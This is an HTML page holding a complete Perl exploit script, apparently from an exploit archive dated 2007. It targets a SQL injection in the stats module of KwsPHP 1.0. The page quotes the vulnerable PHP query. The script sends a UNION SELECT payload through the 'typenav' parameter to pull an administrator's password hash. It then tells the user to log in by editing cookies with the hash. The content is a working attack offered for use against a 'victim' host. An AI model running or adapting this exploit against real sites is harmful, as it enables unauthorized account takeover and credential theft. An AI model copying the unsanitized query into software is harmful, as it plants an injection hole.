<html><head><title>KwsPHP 1.0 stats Module Remote SQL Injection Exploit</title></head><pre>###################################################
#  Script..........................: KwsPHP  ver 1.0 stats Module
#  Script Site..................: http://kws.koogar.org/
#  Vulnerability...............: Remote SQL injection Exploit
#  Access.........................: Remote
#  level.............................: Dangerous
#  Author..........................: S4mi
#  Contact.........................: S4mi[at]LinuxMail.org
####################################################
#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, E.chark, r0_0t, ddx39 
#
####################################################
# This Exploit Work Only When magic_quotes_gpc Is OFF
#
#Usage  :       C:\Xploit.pl  127.0.0.1  /KswPHP/ admin
#Result Screen Shot :
#+**********************+
# Connecting ...[OK]
# Sending Data ...[OK]
#
#  + Exploit succeed! Getting admin information.
# + ---------------- +
# + Username: admin
# + Password: e10adc3949ba59abbe56e057f20f883e
###################################################
#vuln code : \modules\stats\index.php  line ~ 700 - 720
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#	[code]
# 	elseif(isset($aff) &amp;&amp; ($aff==&quot;browser&quot;))
#	{
#	if(isset($typenav))
#	{
#		bloc_head(&quot;Statistiques des navigateurs &quot;.$liste_navigateurs[$typenav]);
#		
#		$tot_nav=0;
#		
#		$requete=reqmysql(&quot;SELECT SUM(hit) as tot FROM `stats` where type='nav' and valeur like '$typenav**%' ORDER BY `type` ASC &quot;);
#		
#		while ($ligne = mysql_fetch_object($requete))
#		{
#			$tot_nav = $ligne-&gt;tot;
#		}
#		$requete=reqmysql(&quot;SELECT * FROM `stats` where type='nav' and valeur like '$typenav**%' ORDER BY `hit` DESC&quot;);
#	[/code]
#########################################################
#!/usr/bin/perl

use IO::Socket ;

&amp;header();

&amp;usage unless(defined($ARGV[0] &amp;&amp; $ARGV[1] &amp;&amp; $ARGV[2]));

$host = $ARGV[0];
$path = $ARGV[1];
$user = $ARGV[2];


syswrite STDOUT ,&quot;\n Connecting ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
								
die &quot;\n Unable to connect to $host\n&quot; unless($sock);

syswrite STDOUT, &quot;[OK]&quot;;

$inject = &quot;9999'/**/UNION/**/SELECT/**/0,0,pass,pseudo/**/FROM/**/users/**/WHERE/**/pseudo='$user'/*&quot;;	

syswrite STDOUT ,&quot;\n Sending Data ...&quot;;

print $sock &quot;POST $path/index.php?mod=stats&amp;aff=browser&amp;typenav=$inject HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n&quot;;
print $sock &quot;Cache-Control: no-cache\n&quot;;
print $sock &quot;Connection: Close\n\n&quot;;

syswrite STDOUT ,&quot;[OK]\n\n&quot;;

while($answer = &lt;$sock&gt;){

if ($answer =~ /nav_(.*?).png/){
print &quot;+ Exploit succeed! Getting admin information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Username: $user\n&quot;;
print &quot;+ Password: $1\n&quot;;
print &quot;+ ----Have Fun---- +\n&quot;;
print &quot;+ You don't need to crack the hash password :D\n&quot;;
print &quot;+ Just login with ur owen information and edit the cookies\n&quot;;
}
}


sub usage{
	print &quot;\nUsage   : perl $0 host /path/ UserName &quot;;
	print &quot;\nExemple : perl $0 www.victim.com /KwsPHP/ admin\n&quot;;
	exit(0);
}
sub header(){
print q(
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#  Script......................: KwsPHP  ver 1.0 stats Module
#  Script Site.................: http://kws.koogar.org/
#  Vulnerability...............: Remote SQL injection Exploit
#  Access......................: Remote
#  level.......................: Dangerous
#  Author......................: S4mi
#  Contact.....................: S4mi[at]LinuxMail.org
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
);
}

# milw0rm.com [2007-09-15]</pre></html>